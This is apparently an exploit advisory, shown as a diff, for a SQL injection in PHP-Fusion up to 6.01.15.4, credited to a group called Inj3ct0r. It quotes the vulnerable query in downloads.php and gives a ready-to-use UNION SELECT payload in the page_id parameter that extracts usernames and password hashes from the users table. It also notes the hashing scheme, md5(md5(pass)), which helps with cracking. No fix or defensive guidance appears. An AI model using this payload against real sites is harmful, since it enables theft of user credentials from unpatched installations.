@@ -1,0 +1,28 @@
+===================================================================
+PHP-Fusion <= 6.01.15.4 (downloads.php) SQL Injection Vulnerability
+===================================================================
+#[+] Discovered By   : Inj3ct0r
+#[+] Site            : Inj3ct0r.com
+#[+] support e-mail  : submit[at]inj3ct0r.com
+
+
+Product: PHP-Fusion 
+Version: 6.01.15.4
+
+Error in file downloads.php
+
+PHP code:
+
+$result = dbquery("SELECT * FROM ".$db_prefix."downloads WHERE download_id='$page_id'");
+
+A vulnerable parameter $ page_id
+
+
+Exploit:
+
+downloads.php?page_id=-1%27+union+select+1,2,user_name,4,user_password,6,7,8,9,10,11,12,13,14,15,16,17+from+rusfusion_users+limit+0,1/*
+
+password is encrypted by: md5 (md5 ($ pass))
+
+
+# ~  - [ [ : Inj3ct0r : ] ]
